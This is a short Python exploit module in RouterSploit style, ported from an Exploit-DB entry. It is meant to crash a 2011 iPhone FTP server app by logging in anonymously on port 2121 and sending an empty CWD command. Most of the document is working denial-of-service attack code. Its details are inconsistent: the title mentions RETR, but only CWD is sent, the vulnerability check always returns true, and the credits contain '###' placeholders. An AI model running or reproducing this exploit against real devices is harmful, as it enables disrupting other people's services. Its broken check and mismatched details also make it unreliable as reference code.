# Exploit Title: iPhone4 FTP Server V1.0 - Empty CWD-RETR Remote Crash
# Date: 2011-05-30
# Author: offsetIntruder
# Software Link: http://itunes.apple.com/us/app/ftp-server/id356055128?mt=8
# Version: 1.0
# Tested on: iPhone4 IOS 4.3.2
# CVE: N/A
 
import socket
import sys
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")


    __info__ = {

        "name": "EDB-ID:17351",
        "description": "iPhone4 FTP Server V1.0 - Empty CWD-RETR Remote Crash "
                       "### ",
        "authors": (
            "offsetIntruder",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/17351",
        ),
        "devices": (
            "iPhone4","EDB-ID:17351"
        ),

    }
    
    def run(self):
        if self.check():
            user="anonymous"
            print("\n iPhone4 FTP Server By Zhang Boyang - Empty CWD-RETR Remote Crash\n")



            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target,2121))
            data = s.recv(1024)
            print("[+] Sending user login...")
            s.send(b"USER " + user.encode() + b'\r\n')
            data = s.recv(1024)
            print("[+] Sending empty CWD...\n")
            s.send(b"CWD \r\n")
            data = s.recv(1024)
            s.close()

        else:

            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
